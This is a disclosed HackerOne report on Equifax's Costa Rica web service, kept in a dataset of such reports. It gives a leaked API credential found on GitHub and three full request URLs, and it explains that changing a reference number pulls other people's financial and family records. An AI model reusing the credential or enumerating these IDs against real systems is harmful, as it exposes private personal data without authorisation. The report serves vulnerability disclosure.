---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '694931'
original_report_id: '694931'
title: Information Leak (Github)
team_handle: equifax
created_at: '2019-09-14T18:01:00.202Z'
disclosed_at: '2020-04-09T20:47:52.176Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 16
tags:
- hackerone
---

# Information Leak (Github)

## Metadata

- HackerOne Report ID: 694931
- Weakness: 
- Program: equifax
- Disclosed At: 2020-04-09T20:47:52.176Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

In Github I found some credentials to use in a webservice that exposes very sensitive information of people, family group, financial situation, and more.

Github:
https://github.com/geraldincg/proyecto/blob/9c89787deb1d217f58b58786d90bfb3eab290237/Proyecto/ViewModels/WebService/ConexionWS.cs

The  webservice is subdomain for Costa Rica:
Change "referencia" identification number to obtain different results.
Example:

https://webservices.equifax.cr/webservices/efx_consultas.asmx/Estudio_360_Fisico?referencia=891550&Cedula=&Usuario=&Clave=EKJH1QF2IXL3FSI4APWSD5XWFGX63KLK76JFXU80RTCQWS&Usuario_Datum=

https://webservices.equifax.cr/webservices/efx_consultas.asmx/Estudio_360_Fisico?referencia=891547&Cedula=&Usuario=&Clave=EKJH1QF2IXL3FSI4APWSD5XWFGX63KLK76JFXU80RTCQWS&Usuario_Datum=

https://webservices.equifax.cr/webservices/efx_consultas.asmx/Estudio_360_Fisico?referencia=891543&Cedula=&Usuario=&Clave=EKJH1QF2IXL3FSI4APWSD5XWFGX63KLK76JFXU80RTCQWS&Usuario_Datum=

## Impact

An attacker can extract information any people in the system.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
